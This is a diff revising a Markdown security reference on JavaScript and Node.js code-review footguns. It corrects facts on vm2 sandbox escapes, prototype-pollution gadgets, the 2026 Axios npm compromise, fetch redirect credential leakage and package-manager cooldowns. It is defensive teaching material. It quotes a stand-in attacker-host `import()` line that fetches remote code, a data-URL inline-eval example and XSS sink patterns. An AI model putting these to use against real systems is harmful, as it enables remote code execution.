@@ -27,20 +27,14 @@
 >   Ecosystem Security Working Group; canonical npm supply-chain
 >   reference
 > - **Bryan English** (@bengl) — Node.js Core Collaborator; member of
->   the Node.js Ecosystem Security Working Group; contributor to the
->   Node.js `permission model` and `--allow-fs-read`-style flag set;
->   reference for built-in-vs-third-party security boundary questions
+>   the Node.js Ecosystem Security Working Group; reference for built-in-vs-third-party security boundary questions
 > - **Patrik Simek** (@patriksimek) — Original author of `vm2`; the
 >   single most cited cautionary tale in the JS-sandbox literature;
->   his 2023 deprecation announcement on `vm2` ("there is no longer
->   any way to safely use vm2") is the canonical end-state for
->   in-process JS sandboxes; the 2026 vm2 revival under new
->   maintainers continued to ship CVEs
-> - **Sven Slootweg** (@joepie91) — Author of the long-running gist
->   "vm2 is not a sandbox" (web archive ~2018-2021) and the Cryto
->   blog posts on JavaScript trust boundaries; sustained public
->   critic of vm2-class isolation; primary source for the "do not
->   run untrusted JS in-process" doctrine
+>   his July 2023 discontinuation announcement on `vm2` ("We now
+>   find ourselves facing an escape so complicated that fixing it
+>   seems impossible") is the canonical end-state for in-process JS
+>   sandboxes; his October 2025 revival of vm2 (3.10.0) continued to
+>   ship CVEs
 > - **Olivier Arteau** (@HoLyVieR) — Researcher, NorthSec 2018; author
 >   of "Prototype Pollution Attack in NodeJS Application" — the
 >   canonical disclosure paper that introduced the bug class, with
@@ -53,9 +47,6 @@
 >   Staicu (CISPA); built the `silent-spring` CodeQL gadget-mining
 >   tooling that confirmed server-side prototype pollution → RCE on
 >   real Node.js corpora
-> - **Mikhail Davidov** (@sirdarkcat) — Independent researcher;
->   long-running mXSS and DOM mutation research; reference for the
->   `outerHTML`-write parsing-differential class
 > - **Ryan Dahl** (@ry) — Creator of Node.js (2009) and Deno (2018);
 >   the "10 Things I Regret About Node.js" JSConf EU 2018 talk that
 >   names the security regrets Deno's permission model addresses
@@ -70,11 +61,11 @@
 > Group (HackerOne-fronted triage for third-party modules); OpenJS
 > Foundation Security AMA series; Snyk Vulnerability DB; GitHub
 > Security Lab / GitHub Advisory Database; npm Inc. security team;
-> Trail of Bits "Are we sandbox yet?" series; PortSwigger Research
+> PortSwigger Research
 > (server-side prototype pollution detection without DoS); MITRE CWE
 > (CWE-1321 prototype pollution, CWE-94, CWE-78, CWE-22, CWE-79);
-> Microsoft Threat Intelligence + Google Threat Intelligence (joint
-> Axios npm advisory, April 2026).
+> Microsoft Threat Intelligence + Google Threat Intelligence (separate
+> Axios npm compromise analyses, 2026).
 >
 > **What this doc is NOT:** not a JavaScript language tutorial, not a
 > replacement for cross-language bug-class guidance, not a substitute
@@ -347,11 +338,11 @@ Arteau's four canonical primitives (NorthSec 2018):
 
 Shcherbakov et al.'s "Silent Spring" (USENIX Security 2023) confirmed
 prototype pollution reaches RCE via gadget chains. The paper's
-`silent-spring` CodeQL toolkit mines real Node.js codebases (express,
-mongoose, ejs) for polluted-then-read patterns. Gadget taxonomy:
-`child_process.spawn` options consuming `env` / `shell` / `cwd`;
-`require` options consuming `paths`; `fs` callbacks consuming
-`encoding`; `Buffer` paths consuming `length`.
+CodeQL-based framework mines Node.js code for polluted-then-read
+patterns; its exploited RCEs were in NPM CLI, Parse Server, and
+Rocket.Chat. Gadget taxonomy:
+`child_process.spawn` options consuming `env` / `shell`;
+`require` consuming `main` / `NODE_OPTIONS`.
 
 The gadget pattern: a downstream API reads `obj.opt` where `opt` is
 optional and the caller did not provide it. The runtime walks the
@@ -372,7 +363,7 @@ a shell invocation, converting argv injection into command injection.
   `hasOwn` does not walk the prototype chain.
 - Allowlist filtering of `__proto__` / `constructor` / `prototype`
   keys at the input-validation layer (`express-mongo-sanitize`-style).
-- ESLint `eslint-plugin-no-prototype-builtins`, `eslint-plugin-security`.
+- ESLint core rule `no-prototype-builtins`, `eslint-plugin-security`.
 
 ### 4.5 The `__proto__` vs `constructor.prototype` bypass
 
@@ -490,14 +481,14 @@ template engines, online judges, no-code platforms, and serverless
 function runners.
 
 Patrik Simek deprecated `vm2` in 2023 with the explicit statement
-that it could not be made secure; subsequent maintainers resurrected
-the project under a new fork. The 2026 wave of vm2 CVEs (the January
+that it could not be made secure; Simek resurrected the project in
+October 2025 (3.10.0). The 2026 wave of vm2 CVEs (the January
 2026 sandbox-escape line, and the May 2026 critical-severity
 disclosures with CVSS up to 10.0) confirmed Simek's original
 position: in-process JS isolation against an attacker who controls
 the source code is structurally infeasible.
 
-Kurt Boberg's CVE-2026-22709 is one of the May 2026 disclosures
+Kurt Boberg's CVE-2026-22709 is one of the January 2026 disclosures
 against the resurrected vm2 line.
 
 ### 6.3 The defensive alternatives
@@ -519,7 +510,7 @@ The treatments in `js_sandbox_escape_expertise.md` cover:
   IPC, kill on misbehavior. The strongest practical sandbox; OS
   process boundaries are the trust boundary.
 
-The first-order rule, from Slootweg ("vm2 is not a sandbox"): if you
+The first-order rule: if you
 want to run untrusted JavaScript, you want a process boundary, not a
 language-level construct.
 
@@ -553,9 +544,9 @@ noting that `flatted.parse` is itself a prototype-pollution sink
 
 Pre-Node-15, an unhandled Promise rejection emitted a deprecation
 warning but did not terminate the process. From Node 15.0.0 onward,
-the default is `--unhandled-rejections=throw`: an unhandled rejection
-crashes the process with an `unhandledRejection` event whose default
-handler calls `process.exit(1)`.
+the default is `--unhandled-rejections=throw`: with no
+`unhandledRejection` hook, an unhandled rejection is raised as an
+uncaught exception and crashes the process.
 
 The footgun: an attacker who can cause an async path to reject without
 a handler can crash a Node.js server. Common shapes:
@@ -672,9 +663,9 @@ attack surface is equivalent: `import(USER)` is module path injection.
 A subtle difference: `import()` can take a URL string. In Node 16+,
 `import('data:text/javascript,console.log(1)')` evaluates inline
 JavaScript from a data URL. `import('http://attacker.example/x.mjs')`
-fetches and evaluates remote JavaScript (this is gated behind the
-`--experimental-network-imports` flag in current Node and may move
-to stable in future releases). The attacker who reaches an `import()`
+fetched and evaluated remote JavaScript only behind the
+`--experimental-network-imports` flag, which was removed in Node
+22.6.0. The attacker who reaches an `import()`
 call with a controlled URL string achieves RCE without touching
 the filesystem.
 
@@ -693,8 +684,8 @@ points:
   dependency's `postinstall` script with the full privileges of the
   user. Lockfile pinning (`package-lock.json`, `pnpm-lock.yaml`,
   `yarn.lock`) pins versions but does not gate script execution.
-- **Phantom dependencies.** The March 2026 Axios compromise (CVE
-  series with Microsoft + Google Threat Intelligence joint advisory)
+- **Phantom dependencies.** The March 2026 Axios compromise (analyzed
+  by Microsoft Threat Intelligence and Google Threat Intelligence)
   introduced a transitive dependency (`plain-crypto-js@4.2.1`) whose
   sole purpose was the `postinstall` hook. The hook delivered a RAT
   across Windows, macOS, and Linux. The package then erased its own
@@ -706,7 +697,7 @@ points:
   - Cooldown / age-gating: see `~/Library/Application
     Support/ClaudeCode/CLAUDE.md` org policy — `npm
     min-release-age=7` (7-day cooldown after publish), `pnpm
-    minimumReleaseAge: 10080` (minutes), `yarn npmMinimalAgeGate: 7`.
+    minimumReleaseAge: 10080` (minutes), `yarn npmMinimalAgeGate: 10080` (minutes).
     Malicious versions are typically caught and yanked within 24
     hours; a 7-day cooldown blocks all but the slowest-detected
     campaigns.
@@ -773,9 +764,8 @@ turned argv injection into RCE.
 
 Argv injection is the cross-language bug class
 (`shell_injection_expertise.md` §2). The JS-specific behavioral note:
-Node's `spawn` does no special validation of argv strings — leading
-dashes, NUL bytes, NUL terminators, and embedded newlines all pass
-through to `execve`.
+Node's `spawn` only rejects NUL bytes in `file` and `args`; leading
+dashes and embedded newlines pass through to `execve`.
 
 ### 9.3 `spawn` with `shell: true`
 
@@ -844,9 +834,10 @@ redirect behavior. `fetch(url)` with no options follows redirects up
 to 20 hops, including redirects to different hosts and different
 protocols (`http` → `https`, `https` → `http`).
 
-The footgun: cross-host redirects forward the original request
-headers, including `Authorization`, `Cookie`, `WWW-Authenticate`,
-and any custom auth headers. An attacker who can induce a redirect
+The footgun: undici (Node's `fetch`) strips only `Authorization`,
+`Cookie`, and `Proxy-Authorization` on cross-origin redirects, and only
+since 5.26.2 (`Cookie`) and 5.28.3/6.6.1 (`Proxy-Authorization`); any
+custom auth header is still forwarded. An attacker who can induce a redirect
 from a server you trust to a server the attacker controls captures
 the credentials in transit.
 
@@ -854,8 +845,8 @@ Kurt Boberg's CVE-2022-0235 (`node-fetch`, January 2022) is the
 canonical disclosure in this class for the Node.js ecosystem.
 `node-fetch` pre-3.1.1 and pre-2.6.7 forwarded `Authorization`,
 `Cookie`, and `WWW-Authenticate` on cross-origin redirects. The fix
-was to drop these headers when the redirect target's origin differs
-from the original.
+was to drop these headers when the redirect target's host is not
+the same domain as, or a subdomain of, the original.
 
 The WHATWG Fetch spec itself defines "redirect-mode" semantics that
 distinguish CORS-credentialed from non-credentialed contexts; the
@@ -879,9 +870,10 @@ the host portion, percent-encoded characters, IPv6 brackets, and the
 authority parsing for `userinfo@host:port`. The differential is the
 SSRF parser-confusion class (`ssrf_url_parsing_expertise.md` §3).
 
-Node's deprecation of `url.parse` was completed in Node 20 (the
-function still exists for compatibility but emits a runtime
-deprecation warning). New code should use `new URL()` exclusively.
+Node documentation-deprecated `url.parse` (DEP0169) in v19.0.0 and
+v18.13.0 and made it an application (runtime, non-`node_modules`)
+deprecation in v24.0.0; the function still exists for compatibility.
+New code should use `new URL()` exclusively.
 
 ### 10.4 SSRF via host-header injection and request smuggling
 
@@ -913,8 +905,7 @@ Audit-relevant patterns:
   service, when the proper fix is to add the internal CA to the
   trust store via `NODE_EXTRA_CA_CERTS`.
 
-ESLint rule `no-insecure-tls` (community-maintained) flags
-`rejectUnauthorized: false`. The defensive posture is to *never*
+The defensive posture is to *never*
 disable validation; use `NODE_EXTRA_CA_CERTS` for trusted internal
 CAs.
 
@@ -1014,8 +1005,8 @@ text interpolation.
 
 `<a href="javascript:USER">` evaluates `USER` as JS in the page
 origin on click. Same surface for `<iframe src=>`, `<object data=>`,
-`<form action=>`. React's `<a href={USER}>` blocks `javascript:` in
-dev; Vue has similar defaults. Defense: allowlist URL schemes
+`<form action=>`. React 16.9+ warns on `javascript:` URLs and React 19
+errors on them in `src`/`href`; Vue does not block them. Defense: allowlist URL schemes
 (`http:`, `https:`, `mailto:`, `tel:`) at the validation layer.
 
 ### 12.7 mXSS via mutation on reparse
@@ -1065,7 +1056,7 @@ inherits `any` propagation. Same defense as §13.3: runtime validator.
 
 ### 13.5 The `strict` flag suite
 
-`tsconfig.json` `"strict": true` enables eight options including
+`tsconfig.json` `"strict": true` enables nine options including
 `noImplicitAny`, `strictNullChecks`, and the audit-relevant
 `useUnknownInCatchVariables` — which types `catch (e)` as `unknown`
 instead of `any`, forcing handlers to narrow before accessing
@@ -1156,7 +1147,7 @@ The core ESLint rules cover the eval family directly:
 - `eqeqeq` — `==`/`!=` forbidden; require `===`/`!==`.
 - `no-eval` — direct or indirect `eval` calls.
 - `no-implied-eval` — `setTimeout` / `setInterval` with a string
-  argument; `new Function(string)`.
+  argument.
 - `no-new-func` — `new Function(...)` constructor.
 
 Enable all four in every project's eslint config.
@@ -1206,7 +1197,7 @@ The 15-item checklist for JS/Node code review:
 15. **npm install discipline.** `--ignore-scripts` for production
     installs; lockfile committed; cooldown via
     `min-release-age=7` (npm) / `minimumReleaseAge: 10080` (pnpm) /
-    `npmMinimalAgeGate: 7` (Yarn); SBOM audited on every upgrade.
+    `npmMinimalAgeGate: "1w"` (Yarn); SBOM audited on every upgrade.
 
 Cross-link: `code_review_expertise.md` for the click-count severity
 heuristic that prioritizes the findings; `cicd_supply_chain_expertise.md`
@@ -1219,8 +1210,7 @@ for the dependency-supply-chain dimension.
 ### 16.1 Bun runtime
 
 Bun (Jarred Sumner, since 2022) is a JavaScriptCore-based runtime
-targeting Node.js compatibility (~98% of the Node test suite as of
-mid-2026). Bun-specific footguns:
+targeting Node.js compatibility. Bun-specific footguns:
 
 - **No permission model.** Bun ships without an analogue to Node's
   experimental `--permission` or Deno's `--allow-*` flag set; every
@@ -1232,8 +1222,10 @@ mid-2026). Bun-specific footguns:
 - **`Bun.*` namespace.** `Bun.serve`, `Bun.spawn`, `Bun.file` have
   their own defaults that may differ from the Node analogues. Worth
   a per-API audit.
-- **`bun install`** runs `postinstall` scripts by default, same as
-  npm; `--ignore-scripts` available.
+- **`bun install`** does not run dependency lifecycle scripts (e.g.
+  `postinstall`) by default, unlike npm, except for packages on its
+  default trusted list or in `trustedDependencies`; `--ignore-scripts`
+  disables them for all packages.
 
 ### 16.2 Deno's permission model
 
@@ -1258,7 +1250,8 @@ against compromised in-process scripts.
 
 ### 16.3 Edge runtime fragmentation (WinterCG)
 
-WinterCG is the W3C alignment effort across Node, Deno, Bun,
+WinterTC (Ecma TC55, formerly the W3C WinterCG community group) is the
+alignment effort across Node, Deno, Bun,
 Cloudflare Workers, and Vercel Edge. As of 2026:
 
 - **Cloudflare Workers** runs V8 isolates; `fetch`, `crypto.subtle`,
@@ -1317,7 +1310,7 @@ Audit pattern: identify the boundary (`getServerSideProps`, framework
 - vm2 (Simek 2023 deprecation and 2026 CVE series):
   [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2).
 - Axios npm compromise (March 2026), Microsoft Threat Intelligence
-  joint advisory: [microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/](https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/).
+  advisory: [microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/](https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/).
 - "Silent Spring: Prototype Pollution Leads to RCE in Node.js"
   (Shcherbakov, Balliu, Staicu — USENIX Security 2023):
   [usenix.org/conference/usenixsecurity23/presentation/shcherbakov](https://www.usenix.org/conference/usenixsecurity23/presentation/shcherbakov);
@@ -1339,8 +1332,8 @@ Audit pattern: identify the boundary (`getServerSideProps`, framework
 - Node.js Ecosystem Security WG: [github.com/nodejs/security-wg](https://github.com/nodejs/security-wg).
 - Snyk Vulnerability DB: [security.snyk.io](https://security.snyk.io/).
 - GitHub Advisory Database: [github.com/advisories](https://github.com/advisories).
-- ESLint plugins: `eslint-plugin-security`, `eslint-plugin-no-unsanitized`,
-  `eslint-plugin-no-prototype-builtins`.
+- ESLint plugins: `eslint-plugin-security`, `eslint-plugin-no-unsanitized`;
+  core rule `no-prototype-builtins`.
 - Semgrep: [semgrep.dev](https://semgrep.dev/) — see
   `semgrep_rule_authoring.md`.
 - CodeQL: [codeql.github.com](https://codeql.github.com/) —
